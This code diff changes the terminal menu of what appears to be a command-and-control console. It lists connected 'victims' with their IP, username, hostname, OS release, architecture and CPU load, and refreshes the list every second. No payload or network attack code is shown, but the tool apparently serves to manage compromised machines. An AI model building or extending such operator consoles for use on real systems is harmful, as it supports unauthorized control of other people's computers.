@@ -155,13 +155,56 @@ bool ncurses_item_cleanup(ITEM **items, int n_items){
   return true;
 }
 
+char *ncurses_victim_desc_0(char *s0, char *s2){
+  char *s1 = "@";
+  char *result = malloc(strlen(s0) + strlen(s1) + strlen(s2) + 1);
+  strcpy(result, s0);
+  strcat(result, s1);
+  strcat(result, s2);
+  return result;
+}
+
+char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
+  char *arch = "arch:";
+  char *release = "release: ";
+  char *hostname = "hostname: ";
+  char *load = "load: ";
+  char *space = " ";
+  char *result = malloc(strlen(arch) +
+                        strlen(s0) +
+                        strlen(space) +
+                        strlen(release) +
+                        strlen(s1) +
+                        strlen(space) +
+                        strlen(hostname) +
+                        strlen(s2) +
+                        strlen(space) +
+                        strlen(load) +
+                        strlen(s3) + 1);
+  strcpy(result, arch);
+  strcat(result, s0);
+  strcat(result, space);
+  strcat(result, release);
+  strcat(result, s1);
+  strcat(result, space);
+  strcat(result, hostname);
+  strcat(result, s2);
+  strcat(result, space);
+  strcat(result, load);
+  strcat(result, s3);
+  return result;
+}
+
 bool ncurses_item_victims(ITEM **items){
   int j = 0;
   for(int i = 0; i < NET_MAX_CLIENTS; ++i){
     if (p_victims[i] != NULL){
-      //printf("[+] username:%s\n", p_victims[i]->sysinfo.username);
-      items[j] = new_item(p_victims[i]->sysinfo.ip,
-                          p_victims[i]->sysinfo.username);
+      items[j] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.ip,
+                                                p_victims[i]->sysinfo.username),
+                          ncurses_victim_desc_1(p_victims[i]->sysinfo.arch,
+                                                p_victims[i]->sysinfo.release,
+                                                p_victims[i]->sysinfo.hostname,
+                                                itoa(p_victims[i]->sysinfo.cpu_usage)));
       j++;
     }
   }
@@ -218,13 +261,14 @@ bool ncurses_wmain(int action){
     box(win_main, 0, 0);
     ncurses_window_title(win_main, win_main_title);
     ncurses_window_footer(win_main, win_main_version);
+    free(items);
     items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
     ncurses_item_victims(items);
     menu = new_menu((ITEM **)items);
     wmove(win_menu, 4, 2);
     wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
     set_menu_win(menu, win_menu);
-    set_menu_sub(menu, derwin(win_menu, 6, 38, 3, 1));
+    set_menu_sub(menu, derwin(win_menu, 6, (x - (x_margin *2) - 4), 3, 1));
     set_menu_mark(menu, " -> ");
     box(win_menu, 0, 0);
     ncurses_print_menu_title(win_menu, 1, 0, (x - (x_margin * 2)), win_menu_title);
@@ -240,14 +284,10 @@ bool ncurses_wmain(int action){
   return false;
 }
 
-void *ncurses_pthread_update_timer(){
-  int n_victims = NET_VICTIMS_TOTAL;
-  ncurses_wmain(NCURSES_WMAIN_UPDATE);
+void *ncurses_pthread_wmain_auto_refresh(){
   while (true){
-    if (n_victims != NET_VICTIMS_TOTAL){
-      ncurses_wmain(NCURSES_WMAIN_UPDATE);
-      n_victims = NET_VICTIMS_TOTAL;
-    }
+    ncurses_wmain(NCURSES_WMAIN_UPDATE);
+    sleep(1);
   }
   pthread_exit(NULL);
 }
@@ -260,8 +300,11 @@ bool ncurses_main(){
   int key;
   ncurses_wmain(NCURSES_WMAIN_INIT);
   ncurses_wmain(NCURSES_WMAIN_UPDATE);
-  pthread_t t_ncurses_pthread_update_timer;
-  if (pthread_create(&t_ncurses_pthread_update_timer, NULL, ncurses_pthread_update_timer, NULL)){
+  pthread_t t_ncurses_pthread_wmain_auto_refresh;
+  if (pthread_create(&t_ncurses_pthread_wmain_auto_refresh,
+                     NULL,
+                     ncurses_pthread_wmain_auto_refresh,
+                     NULL)){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
@@ -272,15 +315,11 @@ bool ncurses_main(){
     }
     if (key == KEY_DOWN){
       menu_driver(menu, REQ_DOWN_ITEM);
-      refresh();
-      wrefresh(win_menu);
-      wrefresh(win_main);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE);
     }
     if (key == KEY_UP){
       menu_driver(menu, REQ_UP_ITEM);
-      refresh();
-      wrefresh(win_menu);
-      wrefresh(win_main);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE);
     }
   }
   ncurses_menu_cleanup(menu);
